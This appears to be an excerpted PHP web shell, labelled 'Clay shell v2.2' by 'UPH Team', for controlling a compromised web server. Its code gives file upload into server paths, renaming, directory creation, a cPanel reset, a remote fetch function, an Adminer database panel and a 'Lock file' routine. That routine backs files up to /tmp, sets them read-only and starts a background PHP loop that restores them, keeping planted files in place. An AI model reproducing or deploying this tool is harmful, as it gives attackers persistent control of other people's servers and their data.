...
function author() {
    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2017 &copy; C L A Y | H A X O R</center></td></table><br>";
    exit();
}
...
echo '<table class="header"><td><center>
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> UPH Team</a></center></div></td><td>';
...
if (isset($_GET['viewfile'])) {
    ...
    if (isset($_POST['gantin'])) {
        ...
        <input type="hidden" name="pilih" value="gantinama">';
        if ($_POST['type'] == "file") {echo '<input type="hidden" name="type" value="file">';
        } else {
            echo '<input type="hidden" name="type" value="dir">';
        }
        echo '<input type="submit" value="Change" name="gantin" class="btn btn-outline-light mb-1"/>
    ...
    <input type='file' name='Clayfile' id='Clay' style='background-color: grey;' class='form-control' name='uplod'>
    <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>
     ...
     if (isset($_POST['uplod'])) {
        ...
        if (empty($_FILES['Clayfile']['name'])) {
            ...
            $data = @file_put_contents($serlok."/".$_FILES['Clayfile']['name'], @file_get_contents($_FILES['Clayfile']['tmp_name']));
                if (file_exists($serlok."/".$_FILES['Clayfile']['name'])) {
                    $fl = $serlok."/".$_FILES['Clayfile']['name'];
                    echo "<br><table class='directory-listing-table' style='border-color:lime;'><td>
                    Uploaded => <font color='lime'><i>".$_FILES['Clayfile']['name']."</i></font><br>";
...
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
    ...
    <br> - Clay shell v2.2 <br> - Created by Clay</td></thead></table>"; exit();
} elseif ($_REQUEST[net('lokfile')] == "opet") {
    echo "<table class='directory-listing-table'><td>
    <h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='Clay-text' style='font-size:12px;'><i> Linux</i></font></h5><hr style='color:#04FBFF;'>
    ...
    if (isset($_POST['submit'])) {
        ...
        $filez = $_POST['pile'];
        $tempe = "/tmp";
        if (file_exists($tempe.'/'.md5($serlok. $filez.'-xClay').Clay_ex($filez).'xhand.Lock') && file_exists($tempe . '/'.Clay_ex($filez).'-xopet')) {
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xopet').Clay_ex($filez).'xClay.Lock', $serlok);
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xClay').Clay_ex($filez).'xhand.Lock', $serlok);
            }
            cmd("cp $filez ".$tempe."/".md5($serlok. $filez.'-xopet').Clay_ex($filez).'xClay.Lock', $serlok);
            @chmod($filez, 0444);
            $content = '<?php
    $tmp = "/tmp";
    $fileperm = Clay_perm("'.$filez.'");
    Clay_cmd("chmod 444 '.$filez.'");
    while (True) {
        if (!file_exists("'.$filez.'")) {
            $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok. $filez.'-xopet').Clay_ex($filez).'xClay.Lock"));
    ...
    function Clay_perm($filez){
        return substr(sprintf("%o", fileperms($filez)), -4);
    }';
    $content = file_put_contents($tempe. "/" .md5($serlok. $filez.'-xClay'). Clay_ex($filez).'xhand.Lock', $content);
    if ($content) {
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>Locked => <font color='lime'>$filez</font></td></table>";
        cmd('php '. $tempe . '/' .md5($serlok. $filez.'-xClay').Clay_ex($filez).'"xhand.Lock" > /dev/null 2>/dev/null &', $serlok);
    } else {
...
echo'</textarea><br>
<input type="hidden" class="input" name="folfig" value="Claycfg"/><br>
...
echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
    ...
    function crot($url){
        $Clay = curl_init($url);
        curl_setopt($Clay, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($Clay, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($Clay, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($Clay, CURLOPT_HEADER, 0);
        return curl_exec($Clay);
        curl_close($Clay);
    } 
        echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> Adminer<font class='Clay-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr><center>
    <form method='POST'>
    <div class='input-group' style='width:300px;'>
    <span class='input-group-text mb-2'>Filename :</span>
    ...
    <form method='POST'>
      ...
      function createDirectory() {
        ...
        $add = $_POST["add"];$Clay = mkdir($_GET['path']."/".$add);
        if ($Clay == true) {
